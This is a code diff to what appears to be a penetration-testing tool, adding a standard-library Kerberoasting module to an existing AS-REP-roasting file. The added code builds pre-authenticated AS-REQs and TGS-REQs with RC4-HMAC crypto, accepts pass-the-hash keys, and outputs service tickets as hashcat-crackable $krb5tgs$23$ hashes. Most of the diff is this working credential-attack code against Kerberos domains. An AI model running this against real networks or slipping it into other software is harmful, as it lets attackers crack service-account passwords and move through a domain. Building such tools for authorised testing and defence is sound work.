@@ -20,11 +20,16 @@ the prove engine. Safety posture: SECURITY.md.
 """
 from __future__ import annotations
 
+import hashlib
+import hmac
+import os
 import shlex
 import socket
 import struct
+import time
 
 from .models import Host, Port
+from .ntlm import normalize_nt_hash, nt_hash, rc4k
 
 _PORT = 88
 _TIMEOUT = 6.0
@@ -65,7 +70,7 @@ def _tlv(tag: int, content: bytes) -> bytes:
 def _int(n: int) -> bytes:
     if n == 0:
         body = b"\x00"
-    else:
+    elif n > 0:
         body = b""
         v = n
         while v:
@@ -73,6 +78,14 @@ def _int(n: int) -> bytes:
             v >>= 8
         if body[0] & 0x80:                             # keep it positive
             body = b"\x00" + body
+    else:
+        # Negative INTEGER (e.g. the -138 KERB_CHECKSUM_HMAC_MD5 cksumtype): minimal
+        # two's-complement with the sign bit set. A plain `v >>= 8` loop would spin
+        # forever here (Python's arithmetic shift of a negative converges to -1).
+        nbytes = 1
+        while n < -(1 << (8 * nbytes - 1)):
+            nbytes += 1
+        body = (n & ((1 << (8 * nbytes)) - 1)).to_bytes(nbytes, "big")
     return _tlv(0x02, body)
 
 
@@ -272,6 +285,256 @@ def roast_user(dc_ip: str, realm: str, user: str,
             return {"user": user, "state": "locked", "code": code}
         return {"user": user, "state": "error", "code": code}
     return {"user": user, "state": "unknown"}
+
+
+# ============================================================================
+# Credentialed Kerberoasting (RC4-HMAC / etype 23) - stdlib, no impacket.
+#
+# With ANY valid domain credential, request a service ticket (TGS) for each SPN
+# and capture its enc-part - encrypted with the service account's key - as a
+# crackable $krb5tgs$23$ hash. Flow (RFC 4120): AS-REQ with PA-ENC-TIMESTAMP ->
+# TGT + session key (decrypt the AS-REP), then a TGS-REQ whose AP-REQ carries an
+# authenticator with a KERB_CHECKSUM_HMAC_MD5 (-138) checksum over the request
+# body. impacket's GetUserSPNs trips over that checksum against a Samba KDC
+# (KRB_AP_ERR_INAPP_CKSUM) where a native RC4 client works; this is that native
+# client. RC4-only (etype 23) - the classic crackable hash and stdlib-friendly
+# (no AES in the standard library). The crypto matches impacket's byte-for-byte
+# (tests/test_kerberoast.py); only the protocol choice differs.
+# ============================================================================
+
+_U_AS_REQ_PA_ENC_TS = 1        # PA-ENC-TIMESTAMP, client key
+_U_AS_REP_ENCPART = 3          # AS-REP enc-part, client key
+_U_TGS_REQ_AUTH_CKSUM = 6      # authenticator cksum over req-body, TGT session key
+_U_TGS_REQ_AUTH = 7            # authenticator, TGT session key
+CKSUM_HMAC_MD5 = -138          # KERB_CHECKSUM_HMAC_MD5
+ETYPE_RC4 = 23
+
+
+def _hmd5(key: bytes, data: bytes) -> bytes:
+    return hmac.new(key, data, hashlib.md5).digest()
+
+
+def _rc4_usage(usage: int) -> int:
+    # RFC 4757 usage export (per the errata: do NOT map 9 to 8).
+    return {3: 8, 23: 13}.get(usage, usage)
+
+
+def rc4_encrypt(key: bytes, usage: int, plaintext: bytes,
+                confounder: bytes | None = None) -> bytes:
+    """RC4-HMAC (arcfour-hmac-md5) encrypt. Matches impacket's _RC4.encrypt."""
+    ki = _hmd5(key, struct.pack("<I", _rc4_usage(usage)))
+    if confounder is None:
+        confounder = os.urandom(8)
+    data = confounder + plaintext
+    cksum = _hmd5(ki, data)
+    ke = _hmd5(ki, cksum)
+    return cksum + rc4k(ke, data)
+
+
+def rc4_decrypt(key: bytes, usage: int, ciphertext: bytes) -> bytes:
+    """RC4-HMAC decrypt with integrity check. Raises ValueError on tampering."""
+    if len(ciphertext) < 24:
+        raise ValueError("RC4-HMAC ciphertext too short")
+    ki = _hmd5(key, struct.pack("<I", _rc4_usage(usage)))
+    cksum, body = ciphertext[:16], ciphertext[16:]
+    ke = _hmd5(ki, cksum)
+    data = rc4k(ke, body)
+    if not hmac.compare_digest(_hmd5(ki, data), cksum):
+        raise ValueError("RC4-HMAC integrity failure")
+    return data[8:]                                    # strip the 8-byte confounder
+
+
+def krb_checksum_hmacmd5(key: bytes, usage: int, data: bytes) -> bytes:
+    """KERB_CHECKSUM_HMAC_MD5 (-138). Matches impacket's _HMACMD5.checksum."""
+    ksign = _hmd5(key, b"signaturekey\0")
+    return _hmd5(ksign, hashlib.md5(struct.pack("<I", _rc4_usage(usage)) + data).digest())
+
+
+# --- extra DER helpers (build on the AS-REP-roast primitives above) --------------
+
+def _octet(b: bytes) -> bytes:
+    return _tlv(0x04, b)
+
+
+def _krbtime(offset: int = 0) -> str:
+    return time.strftime("%Y%m%d%H%M%SZ", time.gmtime(time.time() + offset))
+
+
+def _encrypted_data(etype: int, cipher: bytes) -> bytes:
+    """EncryptedData ::= SEQUENCE { etype[0], cipher[2] } (no kvno)."""
+    return _seq(_ctx(0, _int(etype)), _ctx(2, _octet(cipher)))
+
+
+def _req_body(realm: str, sname: bytes, cname: bytes | None,
+              etypes=(ETYPE_RC4,), nonce: int = 0x6F6F6F6F) -> bytes:
+    """KDC-REQ-BODY. cname is present for AS-REQ, omitted for TGS-REQ."""
+    parts = [_ctx(0, _bitstring32(0x40810010))]        # kdc-options
+    if cname is not None:
+        parts.append(_ctx(1, cname))
+    parts += [
+        _ctx(2, _gstr(realm)),
+        _ctx(3, sname),
+        _ctx(5, _gtime("20370913024805Z")),            # till
+        _ctx(7, _int(nonce)),
+        _ctx(8, _seq(*[_int(e) for e in etypes])),
+    ]
+    return _seq(*parts)
+
+
+# --- AS-REQ (pre-auth) -> TGT + session key --------------------------------------
+
+def _build_as_req_preauth(user: str, realm: str, key: bytes) -> bytes:
+    """A pre-authenticated AS-REQ: proves knowledge of the client key with an
+    encrypted timestamp, so the KDC returns a usable TGT."""
+    pa_ts_enc = _seq(_ctx(0, _gtime(_krbtime())))      # PA-ENC-TS-ENC { patimestamp[0] }
+    enc = rc4_encrypt(key, _U_AS_REQ_PA_ENC_TS, pa_ts_enc)
+    pa_enc_ts = _seq(_ctx(1, _int(2)),                 # PA-DATA: type 2 (PA-ENC-TIMESTAMP)
+                     _ctx(2, _octet(_encrypted_data(ETYPE_RC4, enc))))
+    padata = _seq(pa_enc_ts)                           # SEQUENCE OF PA-DATA
+    body = _req_body(realm, _principal(2, ["krbtgt", realm]), _principal(1, [user]))
+    kdc_req = _seq(_ctx(1, _int(5)), _ctx(2, _int(10)), _ctx(3, padata), _ctx(4, body))
+    return _tlv(0x6A, kdc_req)                          # [APPLICATION 10] AS-REQ
+
+
+def _parse_asrep_tgt(data: bytes, key: bytes) -> tuple[bytes, bytes]:
+    """From an AS-REP: return (raw TGT [APPLICATION 1] Ticket, TGT session key)."""
+    _tag, body, _ = _read_tlv(data, 0)                 # [APPLICATION 11]
+    _t, seq, _ = _read_tlv(body, 0)                    # inner SEQUENCE
+    tgt = _find(seq, 0xA0 | 5)                          # ticket[5] -> the Ticket TLV, verbatim
+    enc = _ctx_inner(seq, 6)                            # enc-part[6] EncryptedData
+    if tgt is None or enc is None:
+        raise ValueError("AS-REP missing ticket/enc-part")
+    cipher = _ctx_inner(enc, 2) or b""
+    dec = rc4_decrypt(key, _U_AS_REP_ENCPART, cipher)  # EncASRepPart [APPLICATION 25/26]
+    _t2, encseq, _ = _read_tlv(dec, 0)                 # unwrap the APPLICATION tag
+    _t3, kdcrep, _ = _read_tlv(encseq, 0)              # inner SEQUENCE (EncKDCRepPart)
+    keyfld = _ctx_inner(kdcrep, 0)                     # key[0] EncryptionKey
+    sesskey = _ctx_inner(keyfld, 1) if keyfld else None    # keyvalue[1]
+    if not sesskey:
+        raise ValueError("AS-REP enc-part missing session key")
+    return tgt, sesskey
+
+
+# --- TGS-REQ -> service ticket ---------------------------------------------------
+
+def _build_tgs_req(realm: str, user: str, spn: str, tgt: bytes, session_key: bytes) -> bytes:
+    body = _req_body(realm, _principal(2, spn.split("/")), None)
+    cksum_val = krb_checksum_hmacmd5(session_key, _U_TGS_REQ_AUTH_CKSUM, body)
+    cksum = _seq(_ctx(0, _int(CKSUM_HMAC_MD5)), _ctx(1, _octet(cksum_val)))
+    authenticator = _tlv(0x62, _seq(                   # [APPLICATION 2] Authenticator
+        _ctx(0, _int(5)),                              # authenticator-vno
+        _ctx(1, _gstr(realm)),                         # crealm
+        _ctx(2, _principal(1, [user])),               # cname
+        _ctx(3, cksum),                                # cksum
+        _ctx(4, _int(0)),                              # cusec
+        _ctx(5, _gtime(_krbtime())),                   # ctime
+    ))
+    enc_auth = rc4_encrypt(session_key, _U_TGS_REQ_AUTH, authenticator)
+    ap_req = _tlv(0x6E, _seq(                           # [APPLICATION 14] AP-REQ
+        _ctx(0, _int(5)),                              # pvno
+        _ctx(1, _int(14)),                             # msg-type
+        _ctx(2, _bitstring32(0)),                      # ap-options
+        _ctx(3, tgt),                                  # ticket (the TGT, verbatim)
+        _ctx(4, _encrypted_data(ETYPE_RC4, enc_auth)),  # authenticator
+    ))
+    padata = _seq(_seq(_ctx(1, _int(1)),               # PA-DATA: type 1 (PA-TGS-REQ)
+                       _ctx(2, _octet(ap_req))))
+    kdc_req = _seq(_ctx(1, _int(5)), _ctx(2, _int(12)), _ctx(3, padata), _ctx(4, body))
+    return _tlv(0x6C, kdc_req)                          # [APPLICATION 12] TGS-REQ
+
+
+def _parse_tgsrep_ticket(data: bytes) -> tuple[int, bytes]:
+    """From a TGS-REP: return (etype, cipher) of the service ticket's enc-part -
+    encrypted with the service account's key, i.e. the crackable material."""
+    _tag, body, _ = _read_tlv(data, 0)                 # [APPLICATION 13]
+    _t, seq, _ = _read_tlv(body, 0)
+    tkt = _find(seq, 0xA0 | 5)                          # ticket[5] -> Ticket [APPLICATION 1]
+    if tkt is None:
+        raise ValueError("TGS-REP missing ticket")
+    _tt, tkt_seq, _ = _read_tlv(tkt, 0)                # unwrap [APPLICATION 1]
+    _ts, tkt_inner, _ = _read_tlv(tkt_seq, 0)          # inner SEQUENCE
+    enc = _ctx_inner(tkt_inner, 3)                     # enc-part[3] EncryptedData
+    if enc is None:
+        raise ValueError("service ticket missing enc-part")
+    et = _ctx_inner(enc, 0)
+    cipher = _ctx_inner(enc, 2) or b""
+    return (int.from_bytes(et, "big") if et else 0), cipher
+
+
+def tgs_hash(user: str, realm: str, spn: str, etype: int, cipher: bytes) -> str:
+    """Format a service ticket's enc-part as a hashcat-crackable hash. etype 23 ->
+    $krb5tgs$23$ (hashcat -m 13100): the 16-byte RC4-HMAC checksum leads the cipher."""
+    if etype == ETYPE_RC4 and len(cipher) >= 16:
+        return (f"$krb5tgs$23$*{user}${realm}${spn}*$"
+                f"{cipher[:16].hex()}${cipher[16:].hex()}")
+    return f"$krb5tgs${etype}$*{user}${realm}${spn}*${cipher.hex()}"
+
+
+def _kdc_error_code(data: bytes) -> int | None:
+    """If the reply is a KRB-ERROR, its error-code; else None."""
+    try:
+        tag, body, _ = _read_tlv(data, 0)
+        if tag != 0x7E:                                # [APPLICATION 30] KRB-ERROR
+            return None
+        _t, seq, _ = _read_tlv(body, 0)
+        err = _ctx_inner(seq, 6)
+        return int.from_bytes(err, "big") if err else -1
+    except (ValueError, IndexError):
+        return None
+
+
+def client_key(password: str = "", nthash: str = "") -> bytes:
+    """The RC4 (etype 23) client key: the NT hash, from a password or a pass-the-hash
+    hex string (LM:NT or bare NT)."""
+    return normalize_nt_hash(nthash) if nthash else nt_hash(password)
+
+
+def kerberoast_spn(dc_ip: str, realm: str, auth_user: str, key: bytes, spn: str,
+                   spn_user: str = "", timeout: float = _TIMEOUT) -> dict:
+    """Roast one SPN with a valid credential. Returns
+    {spn, user, state, hash?, etype?, code?} where state is
+    'roasted' | 'bad_creds' | 'no_spn' | 'error' | 'no_reply'."""
+    realm = realm.upper()
+    label = spn_user or spn.split("/")[0]
+    as_reply = _send_recv(dc_ip, _build_as_req_preauth(auth_user, realm, key), timeout)
+    if as_reply is None:
+        return {"spn": spn, "user": label, "state": "no_reply"}
+    code = _kdc_error_code(as_reply)
+    if code is not None:                               # AS exchange failed (bad creds, etc.)
+        state = "bad_creds" if code in (24, 25, 18, 23, 6) else "error"
+        return {"spn": spn, "user": label, "state": state, "code": code}
+    try:
+        tgt, session_key = _parse_asrep_tgt(as_reply, key)
+    except ValueError:
+        return {"spn": spn, "user": label, "state": "error"}
+    tgs_reply = _send_recv(dc_ip, _build_tgs_req(realm, auth_user, spn, tgt, session_key),
+                           timeout)
+    if tgs_reply is None:
+        return {"spn": spn, "user": label, "state": "no_reply"}
+    code = _kdc_error_code(tgs_reply)
+    if code is not None:                               # 7 = S_PRINCIPAL_UNKNOWN (no such SPN)
+        return {"spn": spn, "user": label,
+                "state": "no_spn" if code == 7 else "error", "code": code}
+    try:
+        etype, cipher = _parse_tgsrep_ticket(tgs_reply)
+    except ValueError:
+        return {"spn": spn, "user": label, "state": "error"}
+    return {"spn": spn, "user": label, "state": "roasted", "etype": etype,
+            "hash": tgs_hash(label, realm, spn, etype, cipher)}
+
+
+def kerberoast(dc_ip: str, realm: str, auth_user: str, key: bytes,
+               targets: list[dict], timeout: float = _TIMEOUT) -> list[dict]:
+    """Roast a list of SPN targets [{spn, user?}] with one credential (one TGT is
+    fetched per SPN for simplicity/robustness). Returns per-target result dicts."""
+    out = []
+    for t in targets:
+        spn = t.get("spn") or ""
+        if not spn:
+            continue
+        out.append(kerberoast_spn(dc_ip, realm, auth_user, key, spn,
+                                  spn_user=t.get("user", ""), timeout=timeout))
+    return out
 
 
 # --- candidate users / realm / DC ------------------------------------------------
